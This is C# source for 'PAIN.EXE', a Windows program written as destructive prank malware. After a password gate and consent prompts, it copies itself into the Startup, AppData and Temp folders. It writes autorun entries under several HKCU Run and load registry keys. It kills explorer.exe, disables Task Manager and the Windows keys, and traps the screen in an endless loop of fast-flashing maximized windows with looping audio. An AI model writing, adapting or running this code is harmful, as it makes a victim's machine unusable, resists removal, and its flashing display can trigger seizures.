using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Reflection;
using System.Windows.Forms;
using PAIN.EXE.Properties;
using System.Threading;
using System.Drawing;
using System.ComponentModel;
namespace PAIN.EXE {
    #region Display()
    public partial class Form1 : Form {
        Random r = new Random();
        public Form1() => InitializeComponent();
        private void timer1_Tick(object sender, EventArgs e) => BackColor = Color.FromArgb(r.Next(0, 255), r.Next(0, 255), r.Next(0, 255));
        private IContainer components = null;
        private System.Windows.Forms.Timer timer1;
        protected override void Dispose(bool disposing) {
            components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent() {
            components = new Container();
            SuspendLayout();
            timer1 = new System.Windows.Forms.Timer(components) {
                Enabled = true,
                Interval = 50 //Standard: 100
            };
            timer1.Tick += new EventHandler(timer1_Tick);
            AutoScaleMode = AutoScaleMode.Font;
            FormBorderStyle = FormBorderStyle.None;
            ShowInTaskbar = false;
            WindowState = FormWindowState.Maximized;
            ResumeLayout(false);

        }
    }
    #endregion
    static class Program {
        [STAThread]
        static void Main() {
            if (!File.Exists(Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Pain.exe"))) {
                #region Intro()
                DialogResult[] Password = new DialogResult[] { DialogResult.Yes, DialogResult.No, DialogResult.Yes, DialogResult.Yes, DialogResult.No };
                bool Success = true;
                string s = "";
                for (int i = 0; i < Password.Length; i++) {
                    DialogResult res = MessageBox.Show("Please enter the password:\r\n" + s, "PAIN.EXE Unpacker", MessageBoxButtons.YesNoCancel);
                    if (res != DialogResult.Yes && res != DialogResult.No)
                        Environment.Exit(0);
                    Success = res == Password[i] && Success;
                    s += "*";
                } if (!Success) {
                    MessageBox.Show("Incorrect.", "PAIN.EXE Unpacker");
                    Environment.Exit(0);
                }
                else
                    MessageBox.Show("Correct. Executing...", "PAIN.EXE");
                if (MessageBox.Show("This software might make your machine unoperable!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("This is the last warning! The author is not responsible for any damage this software causes!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("This application contains flickering images! These might cause epilectic seizures!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("Executing this application requires antiviruses to be disabled.\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("This application might require to be run as admin if your account has admin rights.\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                #endregion
            }
            Process p = new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c \"echo Running...\"" } };
            for (int i = 0; i < 10; i++)
                p.Start();
            #region Persist()
            string ADPath = Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Pain.exe");
            string TMPath = Combine(Path.GetTempPath(), @"Pain.exe");
            RefreshFile(Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), @"Pain.exe"));
            if (RefreshFile(ADPath)) {
                Process.Start(ADPath);
                Environment.Exit(0);
            }
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainAppData", ADPath, RegistryValueKind.String);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainAppData", ADPath, RegistryValueKind.String);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainAppData", ADPath, RegistryValueKind.String);
            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainAppData", ADPath, RegistryValueKind.String);
            RefreshFile(TMPath);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainTemp", TMPath, RegistryValueKind.String);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainTemp", TMPath, RegistryValueKind.String);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainTemp", TMPath, RegistryValueKind.String);
            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainTemp", TMPath, RegistryValueKind.String);

            new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c \"taskkill /f /im explorer.exe\"", CreateNoWindow = false, WindowStyle = ProcessWindowStyle.Minimized } }.Start();
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1, RegistryValueKind.DWord);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
            #endregion
            #region Check()
            Thread.Sleep(new Random(new Random().Next(100, 999)).Next(0, 500));
            if (Process.GetProcessesByName("Pain").Length > 1)
                Environment.Exit(0);
            #endregion
            #region Start()
            Thread t = new Thread(new ThreadStart(Audio));
            t.Start();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            while (true)
                Application.Run(new Form1());
        }

        public static string Combine(string part1, string part2) {
            string p1t = "";
            string p2t = "";
            if (part1.EndsWith(@"\"))
                p1t = part1.Remove(part1.Length - 1);
            else
                p1t = part1;
            if (part2.StartsWith(@"\"))
                p2t = part2.Remove(0);
            else
                p2t = part2;
            return p1t + @"\" + p2t;
        }

        public static void Audio() {
            SoundPlayer soundPlayer = null;
            while (true) {
                if (soundPlayer != null) {
                    soundPlayer.Stop();
                    soundPlayer.Dispose();
                }
                soundPlayer = new SoundPlayer(Resources.hava_nagila);
                soundPlayer.PlayLooping();
                Thread.Sleep(341000);
            }
            #endregion
        }
        #region Define(Persist)
        public static bool RefreshFile(string FilePath) {
            try {
                if (File.Exists(FilePath))
                    return false;
                File.Copy(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath, FilePath);
                return true;
            } catch { return false; }
        }

        public static void RefreshReg(string HKCUKey, string ValueName, object Value, RegistryValueKind type) {
            try {
                Registry.CurrentUser.OpenSubKey(HKCUKey, false).GetValue(ValueName);
            } catch { try {
                    Registry.CurrentUser.CreateSubKey(HKCUKey);
                } catch { }
            } try {
                if (Registry.CurrentUser.OpenSubKey(HKCUKey, false).GetValue(ValueName) != null)
                    return;
                Registry.CurrentUser.OpenSubKey(HKCUKey, true).SetValue(ValueName, Value, type);
            } catch { }
        }
        #endregion
    }
}
